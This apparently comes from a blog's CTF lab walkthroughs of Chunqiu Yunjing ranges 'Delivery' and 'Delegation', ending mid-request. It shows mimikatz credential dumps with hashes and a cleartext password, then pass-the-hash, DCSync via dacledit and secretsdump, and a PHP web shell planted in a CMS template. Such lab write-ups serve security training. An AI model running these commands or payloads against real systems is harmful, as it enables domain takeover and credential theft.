class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line">Using &#x27;1.txt&#x27; for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5725786 (00000000:00575e5a)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : hub</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/6/19 23:56:08</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : hub</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * NTLM     : 38fe728ae616f0fde13715e7c320685f</span><br><span class="line"> * SHA1     : 427861230263a91aefd081d4aa85c45da2a5ba8e</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : hub</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : hub</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5703234 (00000000:00570642)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 23:56:08</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : bf2d6fa7f20d770c21b5ad7be7b930f2</span><br><span class="line"> * SHA1     : 58b99cbb76c79084f8cfa182291219633fc74d60</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 4b 75 56 4f 1b 41 9b 9a a9 5f 4e 4c 6c e5 03 89 f4 c3 00 94 2f f5 21 eb 85 6c 71 b2 d0 6d a0 fe 30 95 d7 74 0f ad 0f 22 29 82 61 5a a2 7f 59 e1 d0 69 0e ec d9 97 ab f2 f3 25 69 12 fb b5 2b f5 a5 7d c6 43 35 61 1b b4 4e 70 3d b7 e0 28 45 26 0f db 35 a2 12 ca 44 29 36 60 3f 24 1b 90 48 65 04 b4 6a c8 54 97 f1 de e9 2d 93 6a 06 52 8a ce 2e 34 52 53 51 e7 c8 3d 11 90 e2 97 2e 58 8b cd 4d 50 4b fb 4d 14 8b e3 15 ae ce ae 07 b2 ea a1 30 d0 01 24 df 0f 57 d6 1f 5f 78 6d fd bc 66 8b cf 07 cd a6 d8 33 30 73 cb 03 2d 7d 26 1a f8 06 83 42 0a 00 2e ac d9 d9 01 f5 5b 97 3c 55 62 d7 9c 4d 4f 9c d2 23 6a 85 92 25 55 bf e7 82 c4 74 08 05 2a a9 c5 78 02 4e ff 86 7c d5 bf 56 8e bb eb b9 26 52 a5 e6 f1 af 16 35 ba 78 20 d0 2f 93 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229811 (00000000:000381b3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : chenglei</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : WIN-DC</span><br><span class="line">Logon Time        : 2025/6/19 22:00:26</span><br><span class="line">SID               : S-1-5-21-3269458654-3569381900-10559451-1105</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line"> * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line"> * DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : Xt61f3LBhg1</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229809 (00000000:000381b1)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : chenglei</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : WIN-DC</span><br><span class="line">Logon Time        : 2025/6/19 22:00:26</span><br><span class="line">SID               : S-1-5-21-3269458654-3569381900-10559451-1105</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line"> * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line"> * DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : Xt61f3LBhg1</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 52708 (00000000:0000cde4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 22:00:13</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d</span><br><span class="line"> * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : `k+hcEDFvtzoObj=&gt;DvzxiNqwyEn;Eu-\zFVAh&gt;.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB&#x27;LLG6wSx6TR%m;`Nfr;;Hf8O&#x27;Szfl0Z=w+^,&gt;0jR</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 22:00:13</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : bf2d6fa7f20d770c21b5ad7be7b930f2</span><br><span class="line"> * SHA1     : 58b99cbb76c79084f8cfa182291219633fc74d60</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win-hauwolao$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : 4b 75 56 4f 1b 41 9b 9a a9 5f 4e 4c 6c e5 03 89 f4 c3 00 94 2f f5 21 eb 85 6c 71 b2 d0 6d a0 fe 30 95 d7 74 0f ad 0f 22 29 82 61 5a a2 7f 59 e1 d0 69 0e ec d9 97 ab f2 f3 25 69 12 fb b5 2b f5 a5 7d c6 43 35 61 1b b4 4e 70 3d b7 e0 28 45 26 0f db 35 a2 12 ca 44 29 36 60 3f 24 1b 90 48 65 04 b4 6a c8 54 97 f1 de e9 2d 93 6a 06 52 8a ce 2e 34 52 53 51 e7 c8 3d 11 90 e2 97 2e 58 8b cd 4d 50 4b fb 4d 14 8b e3 15 ae ce ae 07 b2 ea a1 30 d0 01 24 df 0f 57 d6 1f 5f 78 6d fd bc 66 8b cf 07 cd a6 d8 33 30 73 cb 03 2d 7d 26 1a f8 06 83 42 0a 00 2e ac d9 d9 01 f5 5b 97 3c 55 62 d7 9c 4d 4f 9c d2 23 6a 85 92 25 55 bf e7 82 c4 74 08 05 2a a9 c5 78 02 4e ff 86 7c d5 bf 56 8e bb eb b9 26 52 a5 e6 f1 af 16 35 ba 78 20 d0 2f 93 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 24213 (00000000:00005e95)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 22:00:12</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : bf2d6fa7f20d770c21b5ad7be7b930f2</span><br><span class="line"> * SHA1     : 58b99cbb76c79084f8cfa182291219633fc74d60</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5725815 (00000000:00575e77)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : hub</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/6/19 23:56:08</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : hub</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * NTLM     : 38fe728ae616f0fde13715e7c320685f</span><br><span class="line"> * SHA1     : 427861230263a91aefd081d4aa85c45da2a5ba8e</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : hub</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : hub</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5703211 (00000000:0057062b)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 23:56:08</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : bf2d6fa7f20d770c21b5ad7be7b930f2</span><br><span class="line"> * SHA1     : 58b99cbb76c79084f8cfa182291219633fc74d60</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 4b 75 56 4f 1b 41 9b 9a a9 5f 4e 4c 6c e5 03 89 f4 c3 00 94 2f f5 21 eb 85 6c 71 b2 d0 6d a0 fe 30 95 d7 74 0f ad 0f 22 29 82 61 5a a2 7f 59 e1 d0 69 0e ec d9 97 ab f2 f3 25 69 12 fb b5 2b f5 a5 7d c6 43 35 61 1b b4 4e 70 3d b7 e0 28 45 26 0f db 35 a2 12 ca 44 29 36 60 3f 24 1b 90 48 65 04 b4 6a c8 54 97 f1 de e9 2d 93 6a 06 52 8a ce 2e 34 52 53 51 e7 c8 3d 11 90 e2 97 2e 58 8b cd 4d 50 4b fb 4d 14 8b e3 15 ae ce ae 07 b2 ea a1 30 d0 01 24 df 0f 57 d6 1f 5f 78 6d fd bc 66 8b cf 07 cd a6 d8 33 30 73 cb 03 2d 7d 26 1a f8 06 83 42 0a 00 2e ac d9 d9 01 f5 5b 97 3c 55 62 d7 9c 4d 4f 9c d2 23 6a 85 92 25 55 bf e7 82 c4 74 08 05 2a a9 c5 78 02 4e ff 86 7c d5 bf 56 8e bb eb b9 26 52 a5 e6 f1 af 16 35 ba 78 20 d0 2f 93 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 22:00:13</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 52689 (00000000:0000cdd1)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 22:00:13</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : bf2d6fa7f20d770c21b5ad7be7b930f2</span><br><span class="line"> * SHA1     : 58b99cbb76c79084f8cfa182291219633fc74d60</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 4b 75 56 4f 1b 41 9b 9a a9 5f 4e 4c 6c e5 03 89 f4 c3 00 94 2f f5 21 eb 85 6c 71 b2 d0 6d a0 fe 30 95 d7 74 0f ad 0f 22 29 82 61 5a a2 7f 59 e1 d0 69 0e ec d9 97 ab f2 f3 25 69 12 fb b5 2b f5 a5 7d c6 43 35 61 1b b4 4e 70 3d b7 e0 28 45 26 0f db 35 a2 12 ca 44 29 36 60 3f 24 1b 90 48 65 04 b4 6a c8 54 97 f1 de e9 2d 93 6a 06 52 8a ce 2e 34 52 53 51 e7 c8 3d 11 90 e2 97 2e 58 8b cd 4d 50 4b fb 4d 14 8b e3 15 ae ce ae 07 b2 ea a1 30 d0 01 24 df 0f 57 d6 1f 5f 78 6d fd bc 66 8b cf 07 cd a6 d8 33 30 73 cb 03 2d 7d 26 1a f8 06 83 42 0a 00 2e ac d9 d9 01 f5 5b 97 3c 55 62 d7 9c 4d 4f 9c d2 23 6a 85 92 25 55 bf e7 82 c4 74 08 05 2a a9 c5 78 02 4e ff 86 7c d5 bf 56 8e bb eb b9 26 52 a5 e6 f1 af 16 35 ba 78 20 d0 2f 93 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/6/19 22:00:12</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win-hauwolao$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">mimikatz # </span><br></pre></td></tr></table></figure><p><font style="color:rgb(102, 102, 102);"></font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[00000003] Primary</span><br><span class="line">* Username : WIN-HAUWOLAO$</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : bf2d6fa7f20d770c21b5ad7be7b930f2</span><br><span class="line">* SHA1     : 58b99cbb76c79084f8cfa182291219633fc74d60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> msv :</span><br><span class="line">[00000003] Primary</span><br><span class="line">* Username : chenglei</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line">* SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line">* DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br></pre></td></tr></table></figure><p>记得关校园网(如果访问不了，有可能是wsl的原因，将此处调为一样试试)</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/32.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-cli.exe install</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/33.png"></p><p>收集前先pth到机器用户先，这个机器用户在域内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:WIN-HAUWOLAO$ /domain:XIAORANG.LAB /ntlm:bf2d6fa7f20d770c21b5ad7be7b930f2</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/34.png"></p><p>使用BloodHound进行收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/35.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/36.png"></p><p>点击upload两次，上传成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/37.png"></p><p>可以看到WIN-HAUWOLAO有CHENGLEI的session（的确前面我们也抓取到了CHENGLEI的hash），而CHENGLEI属于ACL Admins 组，ACL Admins 组对 WIN-DC 具有 WriteDacl 权限</p><p>那么我们先给给chenglei去添加DCSync权限以进行DCSync攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py xiaorang.lab/chenglei -hashes :0c00801c30594a1b8eaa889d237c5382 -action write -rights DCSync -principal chenglei -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/38.png"></p><h3 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h3><p>然后进行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py xiaorang.lab/chenglei@172.22.13.6 -hashes :0c00801c30594a1b8eaa889d237c5382 -just-dc-ntlm</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\impacket-0.12.0\examples&gt;python secretsdump.py xiaorang.lab/chenglei@172.22.13.6 -hashes :0c00801c30594a1b8eaa889d237c5382 -just-dc-ntlm</span><br><span class="line">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cb976ec1a1bf8a14a15142c6fecc540e:::</span><br><span class="line">zhangwen:1104:aad3b435b51404eeaad3b435b51404ee:fa7d776fdfc82d3f43c9d8b7f5312d77:::</span><br><span class="line">chenglei:1105:aad3b435b51404eeaad3b435b51404ee:0c00801c30594a1b8eaa889d237c5382:::</span><br><span class="line">zhangtao:1106:aad3b435b51404eeaad3b435b51404ee:e786c4a4987ced162c496d0519496729:::</span><br><span class="line">WIN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:bd5cd1d20449e073c6f3b535f328ad6a:::</span><br><span class="line">WIN-HAUWOLAO$:1103:aad3b435b51404eeaad3b435b51404ee:bf2d6fa7f20d770c21b5ad7be7b930f2:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><h3 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h3><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/39.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\flag&gt; type flag04.txt</span><br><span class="line">d88888b db       .d8b.   d888b   .d88b.    j88D</span><br><span class="line">88&#x27;     88      d8&#x27; `8b 88&#x27; Y8b .8P  88.  j8~88</span><br><span class="line">88ooo   88      88ooo88 88      88  d&#x27;88 j8&#x27; 88</span><br><span class="line">88~~~   88      88~~~88 88  ooo 88 d&#x27; 88 V88888D</span><br><span class="line">88      88booo. 88   88 88. ~8~ `88  d8&#x27;     88</span><br><span class="line">YP      Y88888P YP   YP  Y888P   `Y88P&#x27;      VP</span><br><span class="line"></span><br><span class="line">flag04: flag&#123;60530789-b80e-4e40-8110-b22774fc7d69&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/40.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Delegation</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>信息收集</p><p><a href="http://39.99.128.241/">http://39.99.128.241/</a></p><p>fscan直接扫</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/1.png"></p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/2.png"></p><p>访问一下发现是cms，用poc扫一下，同时搜历史漏洞</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/3.png"></p><p>扫出来了，但是我也搜到了其他的（具体的版本号可以登录后台后确定下来，但是也可以像这样直接探测一下）</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/4.png"></p><p>访问admin，直接跳转</p><p>admin&#x2F;123456</p><p>直接登录成功</p><p>在模版处</p><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=system(<span class="variable">$_POST</span>[a]);die();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/5.png"></p><p>访问主页即可</p><p>主页会加载其他的模块内容</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/6.png"></p><p>这里我用另一个poc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?<span class="keyword">case</span>=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host: 39.98.119.143</span><br><span class="line">Content-Length: 80</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://39.98.119.143</span><br><span class="line">Referer: http://39.98.119.143/index.php?<span class="keyword">case</span>=index&amp;act=index&amp;admin_dir=admin&amp;site=default</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: 